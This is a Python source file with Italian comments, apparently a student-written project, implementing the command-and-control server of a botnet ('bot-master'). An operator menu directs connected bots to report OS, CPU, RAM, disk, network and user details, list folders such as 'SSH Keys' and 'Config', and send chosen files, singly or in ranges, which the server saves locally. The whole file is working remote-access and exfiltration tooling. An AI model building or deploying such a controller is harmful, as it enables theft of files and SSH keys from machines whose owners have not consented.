"""
Codice sorgente per la gestione della connessione con il client (bot-master).

Scritto da:
       Valentino Bocchetti, Valentina Annunziata
       Francesco Ciccarelli, Giulia Caputo
Copyright (c) 2022. All rights reserved.
"""
import asyncio  # Non è necessario importare anche socket (asyncio lo fa da solo)
from aioconsole import ainput  # Async console per asyncio
import aiofiles
import re  # Necessario per la codifica della richiesta ricevuta dal client

# Librerie personali
from . import bot_master_utility as bot_master_utils

__response_options = {"1": "OS-TYPE", "2": "CPU-STATS", "3": "RAM", "4": "PARTITION-DISK-INFO", "5": "PARTITION-DISK-STATUS",
                      "6": "NETWORK-INFO", "7": "USERS", "8": "DOWNLOAD-FILE", "9": "Content-Path", "q": "QUIT"}

# Definiamo degli header custom per identificare il tipo di dato ricevuto dal client
# Per la gestione della ricezione dei file utilizziamo il seguente formato: <File-Name>NOME_FILE<File-Content>CONTENUTO_FILE
__headers_type = {"1": b"<File-Name>", "1-1": b"<File-Content>", "1-2": b"<File-Not-Found>",
                  "2": b"<OS-type>",
                  "3": b"<CPU-stats>", "3-1": b"<CPU-Brand>", "3-2": b"<CPU-Count>", "3-3": b"<CPU-Count-Logical>", "3-4": b"<CPU-Min-Freq>", "3-5": b"<CPU-Max-Freq>",
                  "4": b"<Ram-usage>", "4-1": b"<Ram-Current-Usage>", "4-2": b"<Ram-Total>",
                  "5": b"<Partition-disk-info>", "5-1": b"<Partition-Device>", "5-2": b"<Partition-MountPoint", "5-3": b"<Partition-FSType",
                  "6": b"<Partition-disk-status>", "6-1": b"<Partition-disk-read-status>", "6-2": b"<Partition-disk-write-status>",
                  "7": b"<Network-info>", "7-1": b"<Network-Interface>", "7-2": b"<Network-IP>", "7-3": b"<Network-NetMask>", "7-4": b"<Network-Broadcast>",
                  "8": b"<Users>", "8-1": b"<Users-Name>", "8-2": b"<Users-Active-Since>",
                  "9": b"<Content-Path>",
                  "10": b"<Waiting-For-File>"}

__filesystem_hierarchy_components = {"1": "Home", "2": "Images", "3": "Documents", "4": "SSH Keys", "5": "Config", "6": "local"}  # TODO: Add others path?

__file_range_header = {1: "<Range-File>", 2: "<File-Name>"}

content_dir = []  # Container dei path ricevuti dal client che verrà utilizzato per la selezione dei file da scaricare

__buffer_size = 8192


async def handle_bot_client(reader: asyncio.StreamReader, writer: asyncio.StreamWriter) -> None:
    """Gestione della connessione e delle richieste da effettuare al client."""
    response = None
    stop_key = "quit"
    while True:
        response = await reader.read(__buffer_size)  # Per ridurre i tempi di attesa aumentiamo il buffer
        if response == stop_key.encode():  # Controlliamo che il client non abbia richiesto una disconnessione (modalità stand-by attiva)
            break
        if not response:
            test_addr, test_port = writer.get_extra_info("peername")
            print(f"Il client {test_addr}:{test_port} ha effettuato una connessione di test per la verifica dello stato del server")
            break
        if response == b"Operazione?":  # Se la response è vuota eseguiamo un comando da inviare al client che si tradurrà in una operazione
            await ask_operation(writer)
        else:
            addr, port = writer.get_extra_info("peername")
            await handle_response(response, writer, addr, port)  # Gestiamo automaticamente le richieste di ricezione file/informazioni sullo stato della macchina
        await writer.drain()  # Attendiamo che venga eseguito il flush del writer prima di proseguire
    writer.close()
    await writer.wait_closed()  # Attendiamo che il client sia chiuso prima di stoppare


async def handle_response(response: bytes, writer: asyncio.StreamWriter, addr: str, port: int) -> None:
    """Funzione di gestione per la response (contenuto di file) ricevuta dal client."""
    # Sarebbe stato preferibile utilizzare un case statement ma non è possibile utilizzando startswith
    if response.startswith(__headers_type["1"]):  # Recupero file
        print("Ricezione di un file da parte del client:")

        # In questo modo otteniamo una stringa la response prima dell'header <File-Name> (eliminando il [1] otteniamo una lista con il primo elemento vuoto)
        delete_header = re.split(__headers_type["1"], response)[1]

        name_n_content = re.split(__headers_type["1-1"], delete_header)

        """
        TODO: Da testare
        Volendo assegnare 2 variabili il risultato di `re.split(__headers_type["1-1"], delete_header)` è possibile farlo in questo modo:
        [name, content] = re.split(__headers_type["1-1"], delete_header)
        await handle_response_for_files(name, content)
        """

        await handle_response_for_files(name_n_content[0], name_n_content[-1])  # La lista è composta da 2 elementi e per semplicità passiamo il primo e l'ultimo elemento in questo modo

    elif response.startswith(__headers_type["1-2"]):  # Caso in cui il file non sia presente sul FS
        print(f'Il file richiesto {re.split(__headers_type["1-2"], response)[1].decode()} al client è inesistente')  # Decoding del nome del file in place

    elif response.startswith(__headers_type["2"]):  # Informazioni sul tipo di OS
        print(f'OS-TYPE: {re.split(__headers_type["2"], response)[1].decode()}')

    elif response.startswith(__headers_type["9"]):  # Recupero contenuto di una directory -> Definite in __filesystem_hierarchy_components
        print(f'File: {re.split(__headers_type["9"], response)[1].decode()}')  # Decoding del nome del file in place
        content_dir.append(re.split(__headers_type["9"], response)[1].decode())

    elif response.startswith(__headers_type["10"]):  # Recupero contenuto di una directory -> Definite in __filesystem_hierarchy_components
        # print(f'File: {}')  # Decoding del nome del file in place
        await ask_file_name_to_download(writer)
    else:
        msg = response.decode()
        print(f"Messaggio da {addr}:{port}: {msg!r}")  # Sfruttiamo il Literal String Interpolation (F-String)


async def handle_response_for_files(filename: str, content) -> None:
    """Funzione di gestione per la response (contenuto di file) ricevuta dal client."""
    async with aiofiles.open(b"./result/" + filename, "ab+") as file:
        await file.write(content)  # Salviamo nel file il contenuto ricevuto dal client già formattato


async def ask_operation(writer: asyncio.StreamWriter) -> None:
    """Funzione di richiesta dell'operazione da inviare al client da parte del server."""
    bot_master_utils.print_menu(__response_options, "Operazioni disponibili:", 36)
    try:
        request = await ainput(">>> ")
        if request in __response_options.keys():
            print(f"Opzione scelta: {request}")
            chosen_operation = __response_options.get(request)
            if chosen_operation == "Content-Path":
                await ask_content_path(writer)
            if chosen_operation == "DOWNLOAD-FILE":
                chosen_file = ""
                writer.write(__response_options["8"].encode() + chosen_file.encode())
            else:
                writer.write(chosen_operation.encode())
                await writer.drain()  # Attendiamo che venga eseguito il flush del writer prima di proseguire
        else:
            chosen_operation = "OPERATION_NOT_SUPPORTED"  # Testing nel caso in cui niente di quello inserito dall'utente matchi
            writer.write(chosen_operation.encode())
            await writer.drain()  # Attendiamo che venga eseguito il flush del writer prima di proseguire
    except Exception as e:
        bot_master_utils.info(f"{type(e)}: {e}", 2)
        loop = asyncio.get_event_loop()
        loop.close()


async def ask_file_name_to_download(writer: asyncio.StreamWriter) -> None:
    """Gestione della richiesta del recupero di un file presente sulla macchina dove viene eseguito il client."""
    bot_master_utils.print_menu(content_dir, "Path disponibili:", 70)
    try:
        operation_not_supported = "OPERATION_NOT_SUPPORTED"  # Testing nel caso in cui niente di quello inserito dall'utente matchi
        index = await ainput(">>> ")
        # Controlliamo che l'utente abbia richiesto un range di file
        # Nel caso in cui l'utente voglia selezionare un range di file utilizziamo la forma <n-N> (es 0-10 per selezionare i file che hanno indici da 0 a 10)
        if "-" in index:  # Utilizziamo come separatore <->
            boundary = re.split('-', index)
            filename_range = __file_range_header[1]
            for x in range(int(boundary[0]), int(boundary[1])):
                filename_range += __file_range_header[2] + content_dir[x]

            writer.write(filename_range.encode())

        # Nel caso in cui l'utente non voglia scaricare file utiliziamo <q> come uscita
        elif index == "q":
            bot_master_utils.info(f"Selezionato carattere di uscita <{index}>", 1)
            writer.write(operation_not_supported.encode())
        # Negli altri casi invece selezioniamo un unico file
        else:
            request = int(index)
            if 0 <= request < len(content_dir):
                chosen_file = content_dir[request]
                print(f"Operazione scelta {request} -> {chosen_file}")
                writer.write(__response_options["8"].encode() + chosen_file.encode())
            else:
                writer.write(operation_not_supported.encode())

        # In questo punto svuotiamo la lista (La selezione da parte dell'utente è già avvenuta -> Risulta inutile tenere in memoria informazioni non più utilizzabili)
        # Evitiamo così anche di avere file duplicati o liste potenzialmente enormi (nel caso in cui venga richiesto più di una volta il recupero di uno specifico path)
        content_dir.clear()
        await writer.drain()  # Attendiamo che venga eseguito il flush del writer prima di proseguire
    except Exception as e:
        bot_master_utils.info(f"{type(e)}: {e}", 2)


async def ask_content_path(writer: asyncio.StreamWriter) -> None:
    """Gestione della richiesta del contenuto del FS della macchina su cui viene eseguito il client."""
    bot_master_utils.print_menu(__filesystem_hierarchy_components, "Path disponibili:", 32)
    try:
        request = await ainput(">>>> ")
        if request in __filesystem_hierarchy_components.keys():
            print(f"Operazione selezionata: {request}")
            path_content_choosen = __response_options["9"] + __filesystem_hierarchy_components.get(request)
            writer.write(path_content_choosen.encode())
    except Exception as e:
        #  TODO: In caso di eccezione ritornare (?)
        bot_master_utils.info(f"{type(e)}: {e}", 2)
        loop = asyncio.get_event_loop()
        loop.close()


async def run_server(hostname: str, port: int) -> None:
    """Esecuzione del loop di gestione della connessione con il client."""
    server = await asyncio.start_server(handle_bot_client, hostname, port)

    async with server:
        # async with server:
        await server.serve_forever()
